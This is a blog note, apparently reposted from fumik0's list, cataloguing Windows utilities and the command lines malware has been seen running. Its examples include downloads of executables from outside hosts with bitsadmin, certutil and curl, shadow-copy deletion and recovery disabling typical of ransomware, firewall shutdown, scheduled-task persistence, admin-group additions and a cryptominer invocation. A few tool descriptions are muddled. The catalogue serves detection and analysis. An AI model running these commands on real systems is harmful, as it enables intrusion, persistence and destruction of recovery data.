---
title: "Examples of commands used by Attackers (fumik0's note)"
date: "2019-12-18"
layout: single
tags:
- Malware Analysis
categories:
- Notes
---

This example is all credit to Mastar fumik0 cause highlighted it at his [blog](https://tracker.fumik0.com/learning). I'm just copy the content (make as a note) and improve it in terms of explanation and structure able to make me (or you guys) more understand the topic. 



### attrib
Function: Used to display or change the file attributes for a file or folder. You can also find and set most file and folder attributes in Explorer. Malware used to hide their file using this command.

Reference: [Microsoft attrib manual](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib)

Command  line examples:

    attrib +h "%APPDATA%\tmp_000"
    attrib +r +a +s +h "%APPDATA%\Adobe Reader\ADBR\READER"
    attrib +s +a %WINDIR%\Fonts
    attrib +s +h +r "%APPDATA%\Process\*.*"
    attrib -r -a -s -h -i /s C:\Users\%OSUSER%

### autorun.exe
Function: A Win32 executable program intended for use with the Windows 95, 98, Me, NT4, 2000, and XP AutoRun facility. This facility (if enabled) will **automatically run an executable** as soon as a CD-ROM is inserted into the CD drive of the computer.

Command  line examples:

    autorun.exe "SFXSOURCE:%TEMP%\Temp\chewvga.EXE"

### bcdedit
Function: Most ransomware use this command to remove Shadow Volume Copies and disable Windows automatic startup repair. It performs these commands to make it impossible to use the shadow volumes to recover your files.

Command  line examples:

    bcdedit /set {default} bootstatuspolicy ignoreallfailures
    bcdedit /set {default} recoveryenabled No

### bitsadmin
Function: Used for managing background intelligent transfer. It can download, copy and execute executable by one line command.

Command  line examples:

    bitsadmin /complete QaeGF
    bitsadmin /create /download QaeGF
    bitsadmin /setcustomheaders QaeGF User-Agent:LACARNECOTTA
    bitsadmin /transfer AE /priority foreground https://jgc.com.mx/dat/heavy.jpg %USERPROFILE%\document.exe
    bitsadmin /Resume wstatus
    bitsadmin /SetNotifyCmdLine wstatus "%ALLUSERSPROFILE%\Oracle\hok\jahok.exe" "update"
    bitsadmin /cancel drp_bits_job
    bitsadmin /transfer Nv /priority foreground http://154.16.201.215:2330/ari.exe %USERPROFILE%\RK.exe

### calcs
Function: Displays or modifies discretionary access control lists (DACL) on specified files. An access control list is a list of permissions for securable object, such as a file or folder, that controls who can access it. 

Command  line examples:

    cacls %ALLUSERSPROFILE%\expl0rer.exe /d everyone
    cacls C:\Users\%OSUSER% /T /C /P %OSUSER% :F

### certutil
Function: Windows binary used for handeling certificates. It can also use to download file from internet.

Command  line examples:

    certutil -addstore "Root" p.pem
    certutil -addstore -f "TrustedPublisher" "%PROGRAMFILES%\OpenVPN Technologies\PrivateTunnel\Cert\OpenVPNTechForTap6.cer"
    certutil -decode %TEMP%\B %TEMP%\y.bat
    certutil -A -n "root" -t "TCu,Cuw,Tuw" -i "rootcert.cer" -d "%APPDATA%\Mozilla\Firefox\Profiles/fg6ygf16.default"
    certutil -f -addStore root "%TEMP%\is-5OHTO.tmp\BaltimoreCyberTrustRoot.crt"
    certutil -f -decode %ALLUSERSPROFILE%\Windows\Microsoft\java\dUpdateCheckers.base d.ps1
    certutil -urlcache -split -f http://cache.windowsdefenderhost.com/windows/RecentFileProgrom.exe "C:\\Windows\\Fonts\\RecentFileProgrom.exe"

### choice.exe
Function: Prompts the user to select one item from a list of single-character choices in a batch program, and then returns the index of the selected choice. If used without parameters, choice displays the default choices Y and N.

Command  line examples:

    choice /C Y /N /D Y /T 3
    choice /t 3 /d y /n

### cmstp.exe
Function: CMSTP is a binary which is associated with the Microsoft Connection Manager Profile Installer. It accepts INF files which can be weaponised with malicious commands in order to execute arbitrary code in the form of scriptlets (SCT) and DLL.

Reference: [https://attack.mitre.org/techniques/T1191/](https://attack.mitre.org/techniques/T1191/)

Command  line examples:

    cmstp.exe /s /ns "%APPDATA%\Microsoft\10850.txt"
    cmstp.exe /s /su /ns df81c455-615e-4add-92e3-ce4a12d882d8.inf

### conhost.exe
Function: Host process for the console window. The process sort of sits in the middle between CSRSS and the Command Prompt (cmd.exe)

Command  line examples:

    conhost.exe "-1036909723-245440756159895655010408828331479810903-3149622581357818589-674575599"
    conhost.exe schtasks /create /tn "svchost" /tr "%WINDIR%\resources\svchost.exe" /sc daily /st 17:00 /f

### csc.exe
Function:  CSC stands for Visual C# [sharp] Command-Line Compiler.

Command  line examples:

    csc.exe /noconfig /fullpaths @"%TEMP%\-h_g5jfn.cmdline"

### cscript
Function: Starts a script so that it runs in a command-line environment.

Command  line examples:

    cscript %TEMP%\file.vbs
    cscript //nologo \\tK2PgXIebP\BIN\PreviousDate.vbs

### csv.exe
Function: *//will be add later*

Command  line examples:

    csv.exe %TEMP%\83890727\AARIA
    csv.exe dic=ngi

### curl.exe
Function: A command line tool and library for transferring data with URLs.

Command  line examples:

    curl.exe -o new.exe http://down.pzchao.com:18559/new.exe
    curl.exe -o pass32.exe http://down.pzchao.com:18559/pass32.exe -u 123:456

### cvtres.exe
Function: Windows Resource to Object Converter. It is part of the C++ toolchain to turn resource files (.res) in to compiled objects that can be linked using the linker.

Command  line examples:

    cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:%TEMP%\RES1055.tmp" "%TEMP%\CSC1036.tmp"

### delete
Function: Delete file

Command  line examples:

    delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
    delete HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run /v "Windows Defender" /f
    delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsDefender /f

### devcfg.exe
Function: *//will be add later*

Command  line examples:

    devcfg.exe -add net vnet %PROGRAMFILES%\ShrewSoft\VPN Client\drivers\virtualnet.inf

### dllhost.exe
Function: COM Surrogate

Command  line examples:

    dllhost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}

### dw20.exe
Function: The Windows Error Reporting tool, Dw20.exe, collects information automatically whenever an Office program stops responding.

Command  line examples:

    dw20.exe -x -s 1080

### explorer.exe
Function: Windows shell

Command  line examples:

    explorer.exe /c, "%APPDATA%\Microsoft\Windows\Start Menu\Programs\scanned.exe"
    explorer.exe schtasks /create /tn "svchost" /tr "%WINDIR%\resources\svchost.exe" /sc daily /st 14:59 /f

### find
Function: built-in search capabilities

Command  line examples:

    find "."
    find /i " "
    find /i " 1"
    find /i ".exe"
    find /i "\\"


### findstr
Function: It is used to search for a specific text string in computer files.

Command  line examples:

    findstr /i "ping"
    findstr 0.0.0.0.*0.0.0.0
    findstr [0-99]
    findstr.exe findstr /C:"-"

### icacls
Function: Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories.

Command  line examples:

    icacls . /grant Everyone:F /T /C /Q

### ipconfig
Function: Console application of some operating systems that displays all current TCP/IP network configuration values and refresh Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings.

Command  line examples:

    ipconfig /all
    ipconfig /flushdns

### javaw.exe
Function: The javaw.exe command is identical to java.exe, except that with javaw.exe there is no associated console window

Command  line examples:

    javaw.exe -jar "C:\07afffd621bd06f571b35fac6266abcec66ca8711102dd9a5e500ee897735190.jar"

### mshta.exe
Function: A process which is a part of legitimate Microsoft HTML Application Host for Internet Explorer. This utility executes HTA or HTML files on Windows operating system. 

Command  line examples:

    mshta.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Info.hta"

### msiexec
Function: Provides the means to install, modify, and perform operations on Windows Installer from the command line.

Command  line examples:

    msiexec /i "%TEMP%\VCRedist\VCRedist_2005_x86\8.0.50727.6195\vcredist.msi" /qn
    msiexec /quiet /uninstall {70895169-F9EC-432C-9FC9-4F4761019739}
    msiexec /x "\\atbwfs100\Sourcing\Fit Tracking\03152007\FitTrackingUI.msi" /qn

### net
Function: The net user command is used to add, delete, and otherwise manage the users on a computer. 

Command  line examples:

    net config workstation
    net localgroup "Remote Desktop Users" Matthew /add
    net localgroup administrators Matthew /add
    net session
    net start "Data Sharing Service"
    net stop TeamViewer
    net stop osppsvc /y

### netsh
Function: Netsh is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running.

Command  line examples:

    netsh advfirewall firewall add rule name="DriverPack aria2c.exe" dir=in action=allow program="%TEMP%\7ZipSfx.001\bin\tools\aria2c.exe"
    netsh advfirewall set allprofiles state off
    netsh advfirewall set allprofiles state on
    netsh int ipv6 isatap show state
    netsh int tcp reset
    netsh int tcp set heuristics disabled

### nslookup
Function: Displays information that you can use to diagnose Domain Name System (DNS) infrastructure.

Command  line examples:

    nslookup -q=txt djowy612ygosvyd.com 208.67.220.220
    nslookup -type=a %OSUSER%.check.francefriends.tk.
    nslookup ransomware.bit ns1.wowservers.ru

### nssm.exe
Function: Nssm.exe launches the Non-Sucking Service Manager program. This is not an essential Windows process and can be disabled if known to create problems. NSSM is a free utility that manages background and foreground services and processes. The program can be set to automatically restart failing services.

Command  line examples:

    nssm.exe /install /silent "iSASService" %PROGRAMFILES%\Java\jre1.8.0_25\bin\java.exe

### ping
Function: Computer network administration software utility used to test the reachability of a host on an Internet Protocol network.

Command  line examples:

    ping -n 0 localhost
    ping -n 1 127.0.0.1
    ping -n 2 -w 1000 127.0.0.1
    ping -t 2 -l 10 127.0.0.1
    ping google.com

### powershell.exe
Function: PowerShell is a task automation and configuration management framework from Microsoft, consisting of a command-line shell and the associated scripting language.

Command  line examples:

    powershell.exe "-file" "C:\01674bf1099edd830c974553a4de062f42c5e6759adb6b4da7aadfdd838cc00c.ps1"


### reg
Function: Performs operations on registry subkey information and values in registry entries. Some operations enable you to view or configure registry entries on local or remote computers, while others allow you to configure only local computers. Using reg to configure the registry of remote computers limits the parameters that you can use in some operations. 

Command  line examples:

    reg delete "HKCU\Software\Microsoft\Office\12.0\Word\Resiliency" /F
    reg delete "HKCU\Software\Microsoft\Office\15.0\Word\Resiliency" /F
    reg import %TEMP%\7ZipSfx.001\bin\Tools\\patch.reg
    reg query "HKCU\Control Panel\International" /v sShortDate


### regsvr32.exe
Function: Regsvr32 is a command-line utility to register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry.

Command  line examples:

    regsvr32.exe /n /s "%TEMP%\instx86.tmp" /i:"/cp"

### rundll32.exe
Function: Loads and runs 32-bit dynamic-link libraries (DLLs).

Command  line examples:

    rundll32.exe %APPDATA%\ekcwlvi.dll f1
    rundll32.exe %WINDIR%\system32\shell32.dll,OpenAs_RunDLL %TEMP%\rad3FE20.tmp
    rundll32.exe shell32.dll,Control_RunDLL input.dll

### sc.exe
Function: Creates a subkey and entries for a service in the registry and in the Service Control Manager database.

Command  line examples:

    sc.exe delete TeamViewer
    sc.exe start TeamViewer
    sc.exe stop TeamViewer

### schtasks.exe
Function: Schedules commands and programs to run periodically or at a specific time, adds and removes tasks from the schedule, starts and stops tasks on demand, and displays and changes scheduled tasks.

Command  line examples:

    schtasks /create /sc minute /mo 1 /tn "HomeGroupProvider" /ru system /tr "cmd /c echo Y|cacls %WINDIR%\sxstruse.exe /p everyone:F"
    schtasks.exe "schtasks" /create /tn "NRAT Client Startup" /sc ONLOGON /tr "%APPDATA%\Google\chrome.exe" /rl HIGHEST /f
    schtasks.exe "schtasks" /create /tn "Windows© " /sc ONLOGON /tr "%APPDATA%\winfile\Microsoft©.exe" /rl HIGHEST /f
    schtasks.exe "schtasks" /delete /tn "WebDiscover Browser Launch Task" /f
    schtasks.exe /Create /RU system /SC ONLOGON /TN Microsoft\WindowsDifenderUpdate /TR "wscript %ALLUSERSPROFILE%\WindowsNT\WindowsNT.vbs" /F
    schtasks.exe schtasks /delete /tn "Adobe Flash Player Updaters" /f
    schtasks.exe schtasks /delete /tn "Microsoft\Windows\orangeinside" /f
    schtasks.exe schtasks /delete /tn "Printerceptor" /f
    schtasks.exe schtasks /delete /tn "\Microsoft\Windows\WDI\Adobe\Adobe Flash Updaters" /f
    schtasks.exe schtasks /delete /tn 360 /f
    schtasks.exe schtasks /delete /tn AutoKMSK /f
    schtasks.exe schtasks /delete /tn AutoKMSKK /f
    schtasks.exe schtasks /delete /tn SogouImeMgr /f

### shutdown
Function: Enables you to shut down or restart local or remote computers, one at a time.

Command  line examples:

    shutdown /p /f
    shutdown -a
    shutdown -r -f -t 5
    shutdown -s -f -t 0
    shutdown -s -t 100
    shutdown /s /t 600 /f


### ssh-keygen.exe
Function: The ssh-keygen utility is used to generate, manage, and convert authentication keys.

Command  line examples:

    ssh-keygen.exe -b 1024 -t dsa -f /ssh_host_dsa_key -N ""

### subst.exe
Function: Associates a path with a drive letter. If used without parameters, subst displays the names of the virtual drives in effect.

Command  line examples:

    subst.exe subst b: C:\


### svchost.exe
Function: Svchost.exe is a generic host process name for services that run from dynamic-link libraries.

Command  line examples:

    svchost.exe -k


### takeown
Function: Enables an administrator to recover access to a file that previously was denied, by making the administrator the owner of the file. This command is typically used on batch files.

Command  line examples:

    takeown /f %WINDIR%\system32\Drivers\etc\hosts /a


### taskkill
Function: Ends one or more tasks or processes. Processes can be ended by process ID or image name. 

Command  line examples:

    taskkill /im rundll32.exe /f /T

### tasklist
Function: Displays a list of currently running processes on the local computer or on a remote computer.

Command  line examples:

    tasklist /nh /fi "imagename eq .exe"

### timeout
Function: Pauses the command processor for the specified number of seconds. 

Command  line examples:

    timeout /t 1 /nobreak
    timeout /t 300

### vbc.exe
Function: Compile file to executable (.exe) files or dynamic-link library (.dll) files

Command  line examples:

    vbc.exe -o xmr.pool.minergate.com:45700 -u 1LwkS2UaXY5hrRxR7Kdxo625v41zeHGjxL --cpu-priority 3 --max-cpu-usage 75 --donate-level 1 -p x -t 2
    vbc.exe /noconfig @"%TEMP%\apzjg8gs.cmdline"
    vbc.exe /shtml "%TEMP%\v0xrvacf.goc"
    vbc.exe /stext "%TEMP%\holdermail.txt"

### vssadmin
Function: Displays current volume shadow copy backups and all installed shadow copy writers and providers. 

Command  line examples:

    vssadmin Delete Shadows /All /Quiet
    vssadmin delete shadows /all
    vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded

### wget.exe
Function: Download file

Command  line examples:

    wget.exe http://127.0.0.1:9527 -o "C:\\TestWget.txt" -t 1

### wmic
Function: The WMI command-line (WMIC) utility provides a command-line interface for Windows Management Instrumentation (WMI).

Command  line examples:

    wmic /node:localhost /namespace:\\root\SecurityCenter2 path FirewallProduct get /format:list
    wmic OS get Caption /value
    wmic PAGEFILESET GET MaximumSize /value
    wmic computersystem get domain
    wmic logicaldisk where "DeviceID='C:'" get size
    wmic nicconfig where(ipenabled=true) get index
    wmic path Win32_Processor get Name /value
    wmic path Win32_Processor get NumberOfCores /value
    wmic process where "name='conhost.exe' and ExecutablePath='C:\\windows\\Installer\\conhost.exe'" call Terminate
    wmic shadowcopy delete

### wscript
Function: Windows Script Host provides an environment in which users can execute scripts in a variety of languages that use a variety of object models to perform tasks.

Command  line examples:

    wscript //Nologo "%PUBLIC%\Temp\%OSUSER%.vbs" CxNqfVybn9rBTqHTjjIhA3jiooCiJP5DlgROv3L5qhFsDi4GcAM
    wscript /b %ALLUSERSPROFILE%\Windows\Microsoft\java\GoogleUpdateschecker.vbs
    wscript /e:VBScript.Encode %TEMP%\SysinfY2X.db
    wscript bnbgpnhp.js

### xcopy
Function: Copies files and directories, including subdirectories.

Command  line examples:

    xcopy /l /w "%TEMP%\4064BQBC.bat" "%TEMP%\4064BQBC.bat"
    xcopy /Y /I /S "%TEMP%\NS-1Q8EJ.tmp\tmp\*" "%TEMP%\nsa694.tmp\"
    xcopy /Y /I /S "%TEMP%\NS-2QOKH.tmp\tmp\*" "%TEMP%\nsa796.tmp\"



